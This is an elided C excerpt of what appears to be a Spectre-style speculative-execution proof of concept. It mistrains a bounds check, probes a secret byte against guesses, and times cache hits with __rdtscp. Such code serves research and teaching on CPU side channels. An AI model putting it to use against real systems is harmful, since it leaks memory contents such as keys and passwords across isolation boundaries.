...
__attribute__((noinline)) void test(size_t x, uint8_t k) {
  if (x < array1_size) {
    if (array1[x] == k) {
      temp &= array2[k];
    }
...
void victim_function(size_t x) { test(x, check_value); }
...
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  ...
  for (tries = 999; tries > 0; tries--) {
    ...
    for (int guess_index = 0; guess_index < 256; guess_index++) {
      check_value = guess_index;
      for (j = 29; j >= 0; j--) {
      ...
      addr = &array2[guess_index];
      time1 = __rdtscp(&junk);         /* READ TIMER */
      junk = *addr;                    /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD) {
        // printf("guess_index %d results[0] cache hit\n",guess_index);
        results[guess_index]++; /* cache hit - add +1 to score for this value */
      }
    }
